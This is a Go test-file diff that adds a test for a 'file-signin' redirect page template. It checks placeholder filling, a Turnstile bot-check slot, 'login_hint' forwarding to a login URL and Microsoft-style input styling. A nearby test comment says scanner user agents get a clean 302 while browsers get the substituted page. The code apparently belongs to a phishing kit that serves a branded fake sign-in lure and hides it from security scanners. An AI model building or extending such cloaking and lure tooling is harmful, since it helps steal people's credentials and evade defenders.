@@ -110,6 +110,45 @@ func TestApplyTemplateVarsFallsBackToTemplate(t *testing.T) {
 	}
 }
 
+// the two-step file/sign-in page must resolve every placeholder and keep the
+// login_hint hand-off intact.
+func TestFileSigninTemplate(t *testing.T) {
+	meta, html, err := GetRedirectTemplate("file-signin")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !meta.HasSlot {
+		t.Error("file-signin must expose a Turnstile slot")
+	}
+	out := applyTemplateVars(html, &RedirectPage{Template: "file-signin", Brand: "Acme"})
+	out = strings.ReplaceAll(out, "__DESTINATION__", "https://login.example.com/auth/login")
+	out = strings.ReplaceAll(out, "__DELAY__", "4")
+	for _, ph := range []string{"__TITLE__", "__SUBTITLE__", "__BRAND__", "__BUTTON__", "__ACCENT__", "__LOGO__", "__MSGS__", "__DESTINATION__", "__DELAY__"} {
+		if strings.Contains(out, ph) {
+			t.Errorf("placeholder %s left unreplaced", ph)
+		}
+	}
+	if !strings.Contains(out, `id="__ts_slot__"`) {
+		t.Error("file-signin must keep the Turnstile slot marker")
+	}
+	// with Turnstile enabled the slot is filled in place
+	gated := injectTurnstile(out, &RedirectPage{Template: "file-signin"}, "SITEKEY", true)
+	if strings.Contains(gated, `id="__ts_slot__"`) {
+		t.Error("turnstile slot should be replaced when enabled")
+	}
+	if !strings.Contains(gated, "cf-turnstile") || !strings.Contains(gated, "SITEKEY") {
+		t.Error("turnstile widget not injected")
+	}
+	for _, want := range []string{"login_hint", "__tsPending", "__tsGo", "ms-input", "is-light"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("file-signin missing %q", want)
+		}
+	}
+	if !strings.Contains(out, meta.TitleText+"</h1>") {
+		t.Errorf("step-1 heading should come from the template default")
+	}
+}
+
 // scanner UAs must get a clean 302; browsers must get the substituted page.
 func TestServeRedirectPage(t *testing.T) {
 	dir := t.TempDir()
